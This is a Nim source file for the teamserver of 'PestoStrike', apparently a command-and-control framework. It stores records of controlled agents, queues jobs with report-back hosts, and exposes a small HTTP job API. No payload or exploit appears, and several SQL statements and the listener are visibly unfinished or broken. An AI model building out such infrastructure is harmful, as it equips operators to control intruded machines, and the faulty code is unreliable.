

import net, os, strutils, times
import db_connector/db_sqlite
import std/json
import std/locks
import std/tables
import std/strformat
import ../util/agent, ../util/job, ../util/encrypted_socket, ../util/logger, ../util/json_http_api


let DEBUG: bool = true
let LOGGER = newLogger(DEBUG)

let db = open("teamserver.db", "", "", "")


# create agents table
# id is UUID-v4
db.exec(sql"""
CREATE TABLE IF NOT EXISTS agents (
    id TEXT PRIMARY KEY,
    os TEXT NOT NULL,
    machine_name TEXT NOT NULL,
    user TEXT NOT NULL,
    home_directory TEXT NOT NULL,
    is_admin INT NOT NULL
);
"""
)

# create jobs table
# id is UUID-v4
db.exec(sql"""
CREATE TABLE IF NOT EXISTS jobs (
    id TEXT PRIMARY KEY,
    type INT NOT NULL,
    first_exec_time INT NOT NULL,
    exec_time INT NOT NULL,
    repeat INT NOT NULL,
    report_back_host TEXT NOT NULL,
    report_back_port TEXT NOT NULL,
    FOREIGN KEY(agent) REFERENCES agents(id)
);
"""
)

var AGENT_TABLE = initTable[string, Agent]()

var JOB_TABLE = initTable[string, Job]()
var JOB_LISTENING_POOL: seq[Thread[Job]] = @[];

var JOB_OUTPUT = initTable[string, seq[seq[uint8]]]()
# this is a stack of supplementary input to give to the job
var JOB_COMSTACK = initTable[string, seq[seq[uint8]]]()
var THREAD_LOCK: Lock 

proc register_agent(agent: Agent) =
    AGENT_TABLE[agent.getId()] = agent
    db.exec(sql"INSERT INTO agents (id, os, machine_name, user, home_directory, is_admin) VALUES (?,?,?,?,?,?)",
    agent.getId(), agent.getMachineName(), agent.getUser(), agent.getHomeDirectory(), agent.isAdmin().int
    )

proc register_job(job: Job) =
    JOB_TABLE[job.getId()] = job
    JOB_OUTPUT[job.getId()] = @[]
    db.exec(sql"INSERT INTO jobs (id, type, first_exec_time, exec_time, repeat, report_back_host, report_back_port) VALUES (?,?,?,?,?,?)",
    job.getId(), job.getType().int, job.getFirstExecTime(), job.getExecTime(), job.isRepeating().int, job.getReportBackHost(), job.getReportBackPort()
    )



proc job_listener(job: Job) {.thread.} =
    acquire(THREAD_LOCK)
    #var socket: EncSocket = job.getReportBackSocket()
    release(THREAD_LOCK)
    while true:
        acquire(THREAD_LOCK)
        #var client: EncSocket = socket.listen()
        #LOGGER.log(&"Job {job.getId()} received connection from {client.getHost()}:{client.getPort()}", LogLevel.SUCCESS)
        #JOB_OUTPUT[job.getId()].add(client.recv())
        release(THREAD_LOCK)


proc web_list_agents(): HTTPResponse = 
    var res = "{"
    for agent_id, agent in AGENT_TABLE.pairs:
        res.add(&"\"{agent_id}\":" & agent.asJson() & ",")
    res.add("}")
    var http_response: HTTPResponse = newHTTPResponse(
        200,
        {"Content-Type": "application/json"}.toTable,
        "HTTP/1.1",
        res
    )
    return http_response
            

proc web_listener(port: int) =
    var socket: Socket = newSocket()
    socket.bindAddr(Port(port))
    LOGGER.log(&"Web API listening at http://0.0.0.0:{port}/", LogLevel.INFO)
    socket.listen()
    while true:
        var request: HTTPRequest = handleHTTPRequest(socket)
        var http_response = newHTTPResponse(200,{"test":"test"}.toTable,"HTTP/1.1","")
        let path: string = request.getPath()
        if path == "/":
            http_response.setBody("Hello, there!")
        elif path == "/submitjob":
            var job: Job = json2job(request.getBody())
            register_job(job)
            http_response.setBody("Job successfully submitted!")
        elif path == "/agents":
            http_response = web_list_agents()
        socket.send($http_response)





proc main() =
    LOGGER.log("starting PestoStrike ...", LogLevel.INFO)
    web_listener(8787)

main()



